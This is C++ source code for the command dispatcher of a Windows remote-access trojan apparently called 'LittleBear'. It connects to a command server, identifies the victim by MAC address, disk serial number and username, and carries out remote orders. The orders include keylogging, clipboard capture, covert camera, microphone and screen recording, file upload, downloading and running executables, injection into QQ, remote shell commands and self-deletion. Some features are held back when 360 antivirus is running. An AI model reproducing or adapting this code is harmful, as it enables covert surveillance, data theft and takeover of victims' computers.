#include <Windows.h>
#include "../publicvar.h"
#include "../function/KeyBoard.h"
#include "../function/DeviceInformation.h"
#include "../function/SoundRecord.h"
#include "../BootAutoRun.h"
#include "../function/CameraCapture.h"
#include "../function/AppScreenshot.h"
#include "../function/HardDiskFile.h"
#include "../function/ScreenVideo.h"
#include "../function/ScreenSnapshot.h"
#include "../LittleBearDll.h"
//#include "JncfTrojanFunc.h"
#include "../function/ClipboardText.h"
#include "../AntiVirusInfo.h"
#include "../function/ShellCommand.h"
#include "../InitParams.h"
#include "winternl.h"  
#include "NetWorkdata.h"
#include "../function/RemoteControl.h"
#include "../InjectDll.h"
#include "UploadLogFile.h"
#include "../function/UsbFileWatcher.h"
#include "UploadFile.h"
#include "DownloadFile.h"
#include "../function/DeviceInformation.h"
#include "../function/BasicDeviceInfo.h"
#include "NetWorkData.h"
#include "../function/SuicideSelf.h"
#include "../function/MessageBoxProc.h"
#include "../BootWithApp.h"





//#pragma comment(linker,"/stack:0x100000")

DWORD dwKeyboardOn = FALSE;
DWORD dwDiskFileOn = FALSE;
DWORD dwClipboardOn = FALSE;
DWORD dwInjectOn = FALSE;
DWORD dwRemoteControlOn = FALSE;


DWORD  WINAPI NetWorkCommand(VOID)
{
	char szShowInfo[1024];
	int iRet = 0;
	try
	{
		if (*strLocalMac == 0 )
		{
			iRet = GetNetCardInfo(strLocalIP,cMAC,strLocalMac,strLocalExternalIP,strGateWayIP,strGateWayMac);
		}	

		if(ulVolumeSerialNo == 0){
			iRet = GetDiskVolumeSerialNo(&ulVolumeSerialNo);
			if (iRet == FALSE)
			{
				ulVolumeSerialNo = -1;
				WriteLittleBearLog("GetDiskVolumeSerialNo error\r\n");
			}
		}

		if (*strHostName == 0)
		{
			iRet = GetHostName(strHostName);
		}

		SOCKET hSock = lpsocket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
		if (hSock == SOCKET_ERROR)
		{
			lpwsprintfA(szShowInfo,"LittleBearWorkMain lpsocket error code:%u\r\n",lpRtlGetLastWin32Error());
			WriteLittleBearLog(szShowInfo);
			return FALSE;
		}

		DWORD dwSockTimeOut = CMDSOCK_TIME_OUT_VALUE;
		if (lpsetsockopt(hSock,SOL_SOCKET,SO_SNDTIMEO,(char*)&dwSockTimeOut,sizeof(DWORD))==SOCKET_ERROR)
		{
			lpwsprintfA(szShowInfo,"LittleBearWorkMain lpsend time lpsetsockopt error code:%u\r\n",lpRtlGetLastWin32Error());
			WriteLittleBearLog(szShowInfo);
			lpclosesocket(hSock);
			return FALSE;
		}

		dwSockTimeOut = CMDSOCK_TIME_OUT_VALUE;
		if (lpsetsockopt(hSock,SOL_SOCKET,SO_RCVTIMEO,(char*)&dwSockTimeOut,sizeof(DWORD))==SOCKET_ERROR)
		{
			lpwsprintfA(szShowInfo,"LittleBearWorkMain lprecv time lpsetsockopt error code:%u\r\n",lpRtlGetLastWin32Error());
			WriteLittleBearLog(szShowInfo);
			return FALSE;
		}

		iRet = lpconnect(hSock,(sockaddr*)&stServCmdAddr,sizeof(sockaddr_in));
		if (iRet == SOCKET_ERROR)
		{
			lpclosesocket(hSock);

			lpwsprintfA(szShowInfo,"LittleBearWorkMain lpconnect error code:%u\r\n",lpRtlGetLastWin32Error());
			WriteLittleBearLog(szShowInfo);
			return FALSE;
		}

		char *  lpBuf = new char [NETWORK_DATABUF_SIZE];
		if (lpBuf == 0)
		{
			lpclosesocket(hSock);

			lpwsprintfA(szShowInfo,"LittleBearWorkMain new operator recv buffer error code:%u\r\n",lpRtlGetLastWin32Error());
			WriteLittleBearLog(szShowInfo);
			
			return FALSE;
		}

		LPNETWORKPACKETHEADER firsthdr = (LPNETWORKPACKETHEADER)lpBuf;
		firsthdr->cmd = HEARTBEAT;
		memmove(firsthdr->unique.cMAC,cMAC,MAC_ADDRESS_LENGTH);
		firsthdr->unique.dwVolumeNO = ulVolumeSerialNo;
		firsthdr->unique.compress = DATANONECOMPRESS;
		firsthdr->unique.crypt = DATANONECRYPT;
		memset(firsthdr->unique.username, 0, USERNAME_LIMIT_SIZE);
		lstrcpyA((char*)firsthdr->unique.username, (char*)gUserName);
		firsthdr->packlen = 0;
		iRet = lpsend(hSock,lpBuf,sizeof(NETWORKPACKETHEADER),0);
		if (iRet <= 0)
		{
			delete[]lpBuf;
			lpclosesocket(hSock);

			iRet = GetLastError();
			lpwsprintfA(szShowInfo,"send heartbeat packet error:%u\r\n",iRet);
			WriteLittleBearLog(szShowInfo);
			return FALSE;
		}

		while(TRUE)
		{
			int dwRecvSize = lprecv(hSock,lpBuf,NETWORK_DATABUF_SIZE,0);
			if (dwRecvSize < sizeof(NETWORKPACKETHEADER))
			{
				WriteLittleBearLog("command thread recv data size smaller than packet header\r\n");
				break;
			}

			NETWORKPACKETHEADER packhdr = *(LPNETWORKPACKETHEADER)lpBuf;
			int dwCommand = packhdr.cmd;
			UNIQUECLIENTSYMBOL Unique = packhdr.unique;
			if (memcmp(Unique.cMAC,cMAC,MAC_ADDRESS_LENGTH) || Unique.dwVolumeNO != ulVolumeSerialNo)
			{
				lpwsprintfA(szShowInfo,"recv packet unique or mac not same,recved volumeno:%u,local volumeno:%d\r\n",
					Unique.dwVolumeNO,ulVolumeSerialNo);
				WriteLittleBearLog(szShowInfo);
				break;
			}

			int dwDataSize = packhdr.packlen;
			if (dwDataSize < 0 || dwDataSize >= MAX_BUF_SIZE)
			{
				lpwsprintfA(szShowInfo,"recv packet size:%u error\r\n",dwDataSize);
				WriteLittleBearLog(szShowInfo);
				break;
			} 
			
			if (dwDataSize != dwRecvSize - sizeof(NETWORKPACKETHEADER))
			{
				if (dwCommand == DOWNLOADFILE || dwCommand == INJECTQQ || dwCommand == DOWNLOADRUNEXE)
				{
					if (dwCommand == INJECTQQ )
					{
						WriteLittleBearLog("recv INJECTQQ command\r\n");
						iRet = DownloadFile(hSock,lpBuf, dwRecvSize,NETWORK_DATABUF_SIZE,(b360Running==0) & (dwInjectOn == 0));
						if (iRet == NETWORK_ERROR_CODE )
						{
							break;
						}
						dwInjectOn = TRUE;
					}else if (dwCommand == DOWNLOADFILE)
					{
						WriteLittleBearLog("recv DOWNLOADFILE command\r\n");
						iRet = DownloadFile(hSock,lpBuf, dwRecvSize,NETWORK_DATABUF_SIZE,FALSE);
						if (iRet == NETWORK_ERROR_CODE )
						{
							break;
						}
					}else if (dwCommand == DOWNLOADRUNEXE)
					{
						WriteLittleBearLog("recv DOWNLOADRUNEXE command\r\n");
						iRet = DownloadFile(hSock,lpBuf, dwRecvSize,NETWORK_DATABUF_SIZE,TRUE);
						if (iRet == NETWORK_ERROR_CODE )
						{
							break;
						}
					}
					continue;
				}else{
					lpwsprintfA(szShowInfo,"unrecogonized packet ccommand:%u\r\n", dwCommand);
					WriteLittleBearLog(szShowInfo);
					break;
				}
			} 

			if (dwCommand == HEARTBEAT)
			{
				LPNETWORKPACKETHEADER hdr = (LPNETWORKPACKETHEADER)lpBuf;
				hdr->cmd = HEARTBEAT;
				memmove(hdr->unique.cMAC,cMAC,MAC_ADDRESS_LENGTH);
				hdr->unique.dwVolumeNO = ulVolumeSerialNo;
				hdr->unique.compress = DATANONECOMPRESS;
				hdr->unique.crypt = DATANONECRYPT;
				memset(hdr->unique.username, 0, 16);
				lstrcpyA((char*)hdr->unique.username, (char*)gUserName);
				hdr->packlen = 0;
				iRet = lpsend(hSock,lpBuf,sizeof(NETWORKPACKETHEADER),0);
				if (iRet <= 0)
				{
					iRet = GetLastError();
					lpwsprintfA(szShowInfo,"send heartbeat packet error:%u\r\n",iRet);
					WriteLittleBearLog(szShowInfo);
					break;
				}
			}
			else if (dwCommand == UPLOADFILE)
			{
				WriteLittleBearLog("recv UPLOADFILE command\r\n");
				iRet = UploadFile(hSock,lpBuf, dwRecvSize,NETWORK_DATABUF_SIZE);
				if (iRet == NETWORK_ERROR_CODE )
				{
					break;
				}
			}
			else if (dwCommand == DOWNLOADFILE || dwCommand == INJECTQQ || dwCommand == DOWNLOADRUNEXE)
			{
				if (dwCommand == INJECTQQ )
				{
					WriteLittleBearLog("recv INJECTQQ command\r\n");
					iRet = DownloadFile(hSock,lpBuf, dwRecvSize,NETWORK_DATABUF_SIZE,(b360Running==0) & (dwInjectOn == 0));
					if (iRet == NETWORK_ERROR_CODE )
					{
						break;
					}
					dwInjectOn = TRUE;
				}else if (dwCommand == DOWNLOADFILE)
				{
					WriteLittleBearLog("recv DOWNLOADFILE command\r\n");
					iRet = DownloadFile(hSock,lpBuf, dwRecvSize,NETWORK_DATABUF_SIZE,FALSE);
					if (iRet == NETWORK_ERROR_CODE )
					{
						break;
					}
				}
				else if (dwCommand == DOWNLOADRUNEXE)
				{
					WriteLittleBearLog("recv DOWNLOADRUNEXE command\r\n");
					iRet = DownloadFile(hSock,lpBuf, dwRecvSize,NETWORK_DATABUF_SIZE,TRUE);
					if (iRet == NETWORK_ERROR_CODE )
					{
						break;
					}
				}
			}
			else if (dwCommand == SHELLCOMMAND)
			{
				WriteLittleBearLog("recv SHELLCOMMAND command\r\n");
				NETWORKFILEHDR filehdr = *(LPNETWORKFILEHDR)lpBuf;
				if (filehdr.len < MAX_COMMAND_LENGTH)
				{
					char * szCmd = new char[filehdr.len + 1024];
					memmove(szCmd,lpBuf + sizeof(NETWORKFILEHDR),filehdr.len);
					*(szCmd + filehdr.len) = 0;
					HANDLE hThread = lpCreateThread(0,0,(LPTHREAD_START_ROUTINE)RunShellCmd,(LPVOID)szCmd,0,0);
					lpCloseHandle(hThread);
				}
			}
			else if ( dwCommand == CAMERAVIDEO)
			{
				WriteLittleBearLog("recv CAMERAVIDEO command\r\n");
				if (b360Running == 0)
				{
					NETWORKFILEHDR filehdr = *(LPNETWORKFILEHDR)lpBuf;
					if (filehdr.len < MAX_PATH)
					{
						char szCmd[MAX_PATH] = {0};
						memmove(szCmd,lpBuf + sizeof(NETWORKFILEHDR),filehdr.len);
						*(szCmd + filehdr.len) = 0;
						DWORD ulTimeDelay = atoi(szCmd);
						if (ulTimeDelay >= MAX_TIMELAST_SECONDVALUE)
						{
							ulTimeDelay = MAX_TIMELAST_SECONDVALUE;
						}
						else if (ulTimeDelay <= 0)
						{
							ulTimeDelay = 60;
						}
						HANDLE hThread = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)CameraVideoCapture, (LPVOID)ulTimeDelay, 0, 0);
						lpCloseHandle(hThread);
					}
				}
			}
			else if (dwCommand == SCREENVIDEO)
			{
				WriteLittleBearLog("recv SCREENVIDEO command\r\n");
				NETWORKFILEHDR filehdr = *(LPNETWORKFILEHDR)lpBuf;
				if (filehdr.len < MAX_PATH)
				{
					char szCmd[MAX_PATH] = {0};
					memmove(szCmd,lpBuf + sizeof(NETWORKFILEHDR),filehdr.len);
					*(szCmd + filehdr.len) = 0;
					DWORD ulTimeDelay = atoi(szCmd);
					if (ulTimeDelay >= MAX_TIMELAST_SECONDVALUE)
					{
						ulTimeDelay = MAX_TIMELAST_SECONDVALUE;
					}
					else if (ulTimeDelay <= 0)
					{
						ulTimeDelay = 60;
					}
					HANDLE hThread = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)GetScreenVideo, (LPVOID)ulTimeDelay, 0, 0);
					lpCloseHandle(hThread);
					
				}
			}
			else if (dwCommand == SOUNDRECORD)
			{
				WriteLittleBearLog("recv SOUNDRECORD command\r\n");
				NETWORKFILEHDR filehdr = *(LPNETWORKFILEHDR)lpBuf;
				if (filehdr.len < MAX_PATH)
				{
					char szCmd[MAX_PATH] = {0};
					memmove(szCmd,lpBuf + sizeof(NETWORKFILEHDR),filehdr.len);
					*(szCmd + filehdr.len) = 0;
					DWORD ulTimeDelay = atoi(szCmd);
					if (ulTimeDelay > MAX_TIMELAST_SECONDVALUE)
					{
						ulTimeDelay = MAX_TIMELAST_SECONDVALUE;
					}else if (ulTimeDelay <= 0)
					{
						ulTimeDelay = 60;
					}

					HANDLE hThread = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)SoundRecord, (LPVOID)ulTimeDelay, 0, 0);
					lpCloseHandle(hThread);
				}
			}
			else if (dwCommand == CAMERAPHOTO)
			{
				WriteLittleBearLog("recv CAMERAPHOTO command\r\n");
				if (b360Running == 0)
				{
					HANDLE hThread = lpCreateThread(0,0,(LPTHREAD_START_ROUTINE)CameraPhotoCapture,0,0,0);
					lpCloseHandle(hThread);
				}
			}
			else if (dwCommand == CLIPBOARDRECORD && dwClipboardOn == FALSE)
			{
				WriteLittleBearLog("recv CLIPBOARDRECORD command\r\n");
				dwClipboardOn = TRUE;
				int iTimeval = CLIPBOARD_RECORD_TIME_DELAY;
				HANDLE hThread = lpCreateThread(0,0,(LPTHREAD_START_ROUTINE)GetClipBoardText,(LPVOID)iTimeval,0,0);
				lpCloseHandle(hThread);
			}
			else if (dwCommand == KEYBOARDRECORD && dwKeyboardOn == FALSE)
			{
				WriteLittleBearLog("recv KEYBOARDRECORD command\r\n");
				if (b360Running == 0)
				{
					dwKeyboardOn = TRUE;
					int iTimeval = KEYBOARD_RECORD_DELAY;
					HANDLE hThread = lpCreateThread(0,0,(LPTHREAD_START_ROUTINE)GetKeyBoardRecord,(LPVOID)iTimeval,0,0);
					lpCloseHandle(hThread);
				}
			}
			else if(dwCommand == SUICIDE)
			{
				WriteLittleBearLog("recv SUICIDE command\r\n");
				HANDLE hThread = lpCreateThread(0,0,(LPTHREAD_START_ROUTINE)SuicideSelf,0,0,0);
				lpCloseHandle(hThread);
			}
			else if (dwCommand == DISKFILERECORD && dwDiskFileOn == FALSE)
			{
				WriteLittleBearLog("recv DISKFILERECORD command\r\n");
				dwDiskFileOn = TRUE;
				char strDisk[4096] = { 0 };
				int iLen = lpGetLogicalDriveStringsA(4096,strDisk);
				char * strDiskPtr = strDisk;
				for(int i = 0; i < iLen / 4 ; ++i)
				{
					iRet = lpGetDriveTypeA(strDiskPtr);
					if (iRet == DRIVE_FIXED || iRet == DRIVE_REMOTE || iRet == DRIVE_CDROM || iRet == DRIVE_REMOVABLE) 
						//会出现不存在软盘异常 必须去掉DRIVE_REMOVABLE
					{
						if ( (*strDiskPtr == 'A' || *strDiskPtr == 'B' || *strDiskPtr == 'a' || *strDiskPtr == 'b') && iRet == DRIVE_REMOVABLE)
						{

						}
						else
						{
							HANDLE hThread = lpCreateThread(0,0,(LPTHREAD_START_ROUTINE)DesignateVolumeWatcher,strDiskPtr,0,0);
							lpCloseHandle(hThread);
							lpSleep(1000);			
							//waitfor thread take its parameter
						}
					}
					strDiskPtr += 4;
				} 
			}
			else if (dwCommand == REMOTECONTROL )
			{
				if (dwRemoteControlOn == FALSE)
				{
					dwRemoteControlOn = TRUE;

					WriteLittleBearLog("recv REMOTECONTROL command\r\n");
					HANDLE hThread = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)RemoteControl, 0, 0, 0);
					lpCloseHandle(hThread);
				}

			}else if (dwCommand == MESSAGEBOX)
			{
				WriteLittleBearLog("recv MESSAGEBOX command\r\n");
				NETWORKPACKETHEADER * hdr = (NETWORKPACKETHEADER*)lpBuf;
				LPDOUBLESTRINGPARAM param = (LPDOUBLESTRINGPARAM)(lpBuf + sizeof(NETWORKPACKETHEADER));
				if (hdr->packlen < MAX_CMD_LIMIT_SIZE)
				{
					char * lpparam = new char [hdr->packlen + 1024];
					memmove(lpparam,(char*)param,hdr->packlen);

					HANDLE hThread = lpCreateThread(0,0,(LPTHREAD_START_ROUTINE)MessageBoxProc,lpparam,0,0);
					lpCloseHandle(hThread);
				}
			}
			else if (dwCommand == SYSTEMINFO)
			{
				CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)GetMachineInfo, 0, 0, 0));
				WriteLittleBearLog("recv SYSTEMINFO command\r\n");
			}
		}

		delete [] lpBuf;
		lpclosesocket(hSock);
		return FALSE;
	}
	catch (...)
	{
		iRet = lpRtlGetLastWin32Error();
		
		lpwsprintfA(szShowInfo,"GetStartupConfig function exception error code is:%u\r\n",iRet);
		WriteLittleBearLog(szShowInfo);
		return FALSE;
	}
	return TRUE;
}


